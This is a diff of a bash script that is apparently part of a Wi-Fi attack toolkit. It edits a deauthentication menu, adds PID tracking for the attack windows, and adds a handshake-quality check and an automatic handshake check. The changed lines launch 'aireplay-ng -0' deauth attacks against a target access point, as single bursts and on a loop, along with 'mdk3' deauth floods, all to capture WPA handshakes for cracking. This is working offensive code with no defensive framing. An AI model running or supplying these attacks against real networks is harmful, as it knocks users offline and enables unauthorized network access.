@@ -14,6 +14,21 @@ printf '\033]2;DEAUTH MENU\a'
 REDEAUTH="n"
 WLANNM=$(cat /root/lscript/wlanmon.txt)
 export WLANNM
+function find_pid
+{
+j=1
+while true
+do
+	CURPID="dpid"$j".txt"
+	FINDPID=$(ls "$LPATH" | grep "$CURPID")
+	if [[ "$FINDPID" == "" ]]
+	then
+		AVPID="$CURPID"
+		break
+	fi
+	j=$((j+1))
+done
+}
 function defaults_lh2
 {
 #path for lscript
@@ -179,15 +194,21 @@ function pyrit_hand_check
 		TEMPHANDD=$(echo "$TEMP" | grep "good")
 		if [[ "$TEMPHANDD" = "" ]]
 		then
-			#TEMPHANDDD=$(pyrit -r "$HANDCAP" analyze 2>/dev/null | grep "bad")
-			TEMPHANDDD=$(echo $TEMP | grep "bad")
-			if [[ "TEMPHANDDD" = "" ]]
-			then
-				echo -e "Handshake found!(Status: "$RS"unknown"$CE")"
+			TEMPHAD=$(echo "$TEMP" | grep "workable")
+			if [[ "$TEMPHAD" = "" ]]
+			then	
+				#TEMPHANDDD=$(pyrit -r "$HANDCAP" analyze 2>/dev/null | grep "bad")
+				TEMPHANDDD=$(echo "$TEMP" | grep "bad")
+				if [[ "TEMPHANDDD" = "" ]]
+				then
+					echo -e "Handshake found!(Status: "$RS"unknown"$CE")"
+				else
+					echo -e "Handshake found!(Status: "$RS"bad"$CE")"
+				fi
+				sleep 2
 			else
-				echo -e "Handshake found!(Status: "$RS"bad"$CE")"
-			fi
-			sleep 2
+				echo -e "Handshake found!(Status: "$RS"workable"$CE")"
+			fi			
 		else
 			echo -e "Valid handshake found!(Status: "$YS"good"$CE")"
 			sleep 2
@@ -239,12 +260,26 @@ do
 	echo -e ""$YS" 4"$CE") Deauth all periodically         aireplay-ng"
 	if [[ "$HANDF" != "deauth" ]]
 	then
-		echo -e ""$YS" 5"$CE") Check handshake quality"
+		#~ if [[ -f "$LPATH"/settings/checkauto.txt ]]
+		#~ then
+			#~ read checka < "$LPATH"/settings/checkauto.txt
+			#~ if [[ "$checka" == 1 ]]
+			#~ then
+				#~ checkauto="Automatic"
+			#~ else
+				#~ checkauto=""$RS"Manual"$CE""
+			#~ fi
+		#~ else
+			#~ checkauto=""$RS"Manual"$CE""
+		#~ fi				
+		echo -e ""$YS" 5"$CE") Check handshake quality" ##          "$YS"$checkauto"$CE""
+		echo -e ""$YS" 6"$CE") Autocheck for handshake"
+		#echo -e ""$YS" 7"$CE") Empty the file (when big & no handshake)"
 	fi
-	if [[ "$LASTOPTIONS" != "" ]]
-	then
-		echo -e ""$YS"ENTER"$CE") Last option"
-	fi
+	#~ if [[ "$LASTOPTIONS" != "" ]]
+	#~ then
+		#~ echo -e ""$YS"ENTER"$CE") Last option"
+	#~ fi
 	echo -e ""$YS" 0"$CE") Exit"
 	read DT
 	if [[ "$DT" = 1 ]]
@@ -259,7 +294,9 @@ do
 		LASTOPTIONS="aireplay-ng -0 $DEAUTHS -a $TARGB $IGNN $WLANNM && exit"
 		export DEAUTHS
 		export TARGB
-		xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB $IGNN $WLANNM && exit; exec bash' & disown
+		find_pid
+		export AVPID
+		xterm -geometry 90x15+9999+999999 -T "DEAUTHING" -e bash -c 'DPID1=$$ && export DPID1 && echo "$DPID1" > $LPATH/$AVPID && aireplay-ng -0 $DEAUTHS -a $TARGB $IGNN $WLANNM && exit; exec bash' & disown
 	elif [[ "$DT" == 4 ]]
 	then
 		echo -e "Number of deauths per time: "
@@ -285,7 +322,9 @@ do
 		clear
 		PER=1
 		LASTOPTIONS="4"
-		xterm -geometry 90x15+9999+999999 -T "DEAUTHING" -e "while true; do aireplay-ng -0 $DPT -a $TARGB $IGNN $WLANNM; sleep $DIS; done && exit" & disown
+		find_pid
+		export AVPID
+		xterm -geometry 90x15+9999+999999 -T "DEAUTHING" -e 'DPID1=$$ && export DPID1 && echo "$DPID1" > $LPATH/$AVPID && while true; do aireplay-ng -0 $DPT -a $TARGB $IGNN $WLANNM; sleep $DIS; done && exit' & disown
 	elif [[ "$DT" == 5 ]]
 	then
 		if [[ "$HANDF" != "deauth" ]]
@@ -311,31 +350,59 @@ do
 				fi
 			done
 		fi
-	elif [[ "$DT" == "" ]]
+#	elif [[ "$DT" == 7 ]]
+#	then
+#		if [[ "$HANDF" != "deauth" ]]
+#		then
+#			echo "" > /root/handshakes/"$HANDF"-01* && echo -e "Done"
+#		fi
+	elif [[ "$DT" == 6 ]]
 	then
-		if [[ "$HANDFORDEAUTH" != "" ]]
+		if [[ "$HANDF" != "deauth" ]]
 		then
-			if [[ "$LASTOPTIONS" != "" ]]
+			echo -e "Interval in seconds("$YS"Enter"$CE"="$YS"5"$CE"): "
+			read Del
+			if [[ "$Del" == "" ]]
 			then
-				if [[ "$LASTOPTIONS" = 1 ]]
-				then
-					option3
-				elif [[ "$LASTOPTIONS" = 4 ]]
-				then
-					xterm -geometry 90x15+9999+999999 -T "DEAUTHING" -e "while true; do aireplay-ng -0 $DPT -a $TARGB $IGNN $WLANNM; sleep $DIS; done && exit" & disown
-				else
-					xterm -geometry 90x15+9999+999999 -e bash -c "$LASTOPTIONS; exec bash" & disown
-				fi
+				Del=5
+			fi
+			if [[ "$Del" -gt 0 ]]
+			then
+				export Del
+				export HANDCAP
+				xterm -geometry 50x20+0+999999 -T "AUTOCHECK FOR HANDSHAKE" -e "lh21" & disown
+			else
+				echo -e ""$RS"Invalid interval"$CE""
+				sleep 2
 			fi
 		fi
-		sleep 2
+	#~ elif [[ "$DT" == "" ]]
+	#~ then
+		#~ if [[ "$HANDFORDEAUTH" != "" ]]
+		#~ then
+			#~ if [[ "$LASTOPTIONS" != "" ]]
+			#~ then
+				#~ if [[ "$LASTOPTIONS" = 1 ]]
+				#~ then
+					#~ option3
+				#~ elif [[ "$LASTOPTIONS" = 4 ]]
+				#~ then
+					#~ xterm -geometry 90x15+9999+999999 -T "DEAUTHING" -e "while true; do aireplay-ng -0 $DPT -a $TARGB $IGNN $WLANNM; sleep $DIS; done && exit" & disown
+				#~ else
+					#~ xterm -geometry 90x15+9999+999999 -e bash -c "$LASTOPTIONS; exec bash" & disown
+				#~ fi
+			#~ fi
+		#~ fi
+		#~ sleep 2
 	elif [[ "$DT" = 2 ]]
 	then
 		echo "$TARGB" > /root/mdk3bssid.txt
 		LASTOPTIONS="mdk3 $WLANNM d -b /root/mdk3bssid.txt -c $TARGC"
 		export DEAUTHS
 		export TARGB
-		xterm -geometry 90x15+9999+999999 -e bash -c 'mdk3 $WLANNM d -b /root/mdk3bssid.txt -c $TARGC; exec bash' & disown
+		find_pid
+		export AVPID
+		xterm -geometry 90x15+9999+999999 -T "DEAUTHING WITH MDK3" -e bash -c 'DPID1=$$ && export DPID1 && echo "$DPID1" > $LPATH/$AVPID && mdk3 $WLANNM d -b /root/mdk3bssid.txt -c $TARGC; exec bash' & disown
 	elif [[ "$DT" = 3 ]]
 	then
 		LASTOPTIONS=1
